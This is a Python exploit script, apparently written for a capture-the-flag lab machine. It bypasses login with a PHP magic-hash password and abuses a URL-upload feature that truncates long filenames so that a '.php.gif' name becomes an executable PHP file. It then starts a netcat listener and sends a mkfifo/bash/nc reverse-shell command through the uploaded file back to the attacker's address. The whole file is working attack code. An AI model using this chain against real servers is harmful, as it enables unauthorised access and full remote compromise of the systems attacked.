import requests
import urllib3
import subprocess
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

injectionURL = "http://10.10.10.73/login.php"

data = {'username':'admin', 'password':'240610708'}
request = session.post(injectionURL, verify=False, proxies=proxies, data=data)

# Starting pyhon
http_server = subprocess.Popen(["python3","-m","http.server", "80"])


# Uploading File
uploadURL = "http://10.10.10.73/upload.php"

data = {'url':'http://10.10.14.4/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABC.php.gif'}
request = session.post(uploadURL, verify=False, proxies=proxies, data=data)

# print(request.text)

# Getting path of uploaded file and reverse shell
soup = BeautifulSoup(request.text, 'html.parser')
pre_tag = soup.find('pre').get_text()
directory = pre_tag[30:].split(';')[0]

subprocess.Popen(["nc","-nvlp","9000"])
time.sleep(1)

data = {'cmd':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.4 9000 >/tmp/f'}
fileURL = "http://10.10.10.73/uploads/" + directory + "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABC.php"
request = session.post(fileURL, verify=False, proxies=proxies, data=data)


